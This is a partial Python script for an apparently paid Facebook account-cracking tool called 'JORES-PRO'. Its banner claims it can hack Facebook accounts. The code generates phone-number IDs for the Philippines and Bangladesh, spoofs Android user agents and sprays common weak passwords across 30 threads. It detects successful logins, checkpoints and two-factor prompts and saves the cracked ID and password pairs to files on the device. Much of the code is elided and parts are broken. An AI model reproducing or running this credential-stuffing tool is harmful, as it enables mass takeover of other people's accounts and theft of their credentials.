...
try:
	...
	print('\x1b[1;95m[√] LOADING BY JORES SABPI...')
...
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1.12;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
...
logo=("""\033[1;37m
 ...
 ___|   ||  |_|  ||    __  ||    ___||_____  |
|       ||       ||   |  | ||   |___  _____| |
|_______||_______||___|  |_||_______||_______|
----------------------------------------------
 Owner     : JORES SABPI
 Github    :  JoresSabpi-404
 Facebook  : JORES SABPI
 Tool Name : JORES-PRO
 Whats app : +639555581164
 Tool type : PAID
----------------------------------------------
 For Here: GAMIT ANG HACKING MAARI MAKA HACK NG FACEBOOK ACCOUNT KING JORES SABPI LANG SAKALAM 👌💥😝😎😎
----------------------------------------------
 For Haters: SALAMAT SA INYO SAPAG GAMIT NG AKING COMMAND 💚✌️✌️👌🥰
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        clear()
                                        print(' \033[1;32mWorking password for Philipenes\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                                        linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Jores:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','jores1122','khan12345','khan123','khan123456','khankhan123']
...
def bd():
                ...
                with tred(max_workers=30) as Jores:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Philipenes','bangladesh','i love you','iloveyou','free fire','freefire']
                                Jores.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: jores, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, jores, ali \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JORES-XD 💚] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [JORES-OK💚] %s | %s'%(ids,pas))
                                open('/sdcard/JORES-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Jores:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [JORES-CP💚] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JORES-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JORES-OK💚] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JORES-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[JORES-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [JORES-CP💚] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SABPI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/JORES-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [JORES-OK💚] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JORES-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [JORES-CP💚] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JORES-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
